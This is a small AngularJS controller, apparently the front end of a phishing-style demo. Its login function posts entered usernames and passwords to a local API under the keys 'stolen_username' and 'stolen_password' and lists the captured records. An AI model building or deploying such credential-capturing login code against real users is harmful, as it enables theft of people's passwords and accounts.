var app = angular.module("app", []);

app.controller("AppCtrl", function($http) {
    var app = this;

    $http.get("/api/entry").success(function(data) {
        app.entries = data.objects;
    })

    app.login = function(username, password) {
        $http.post("/api/entry", {"stolen_username": username, "stolen_password": password})
            .success(function(data) {
                app.entries.push(data);
            })

    }

})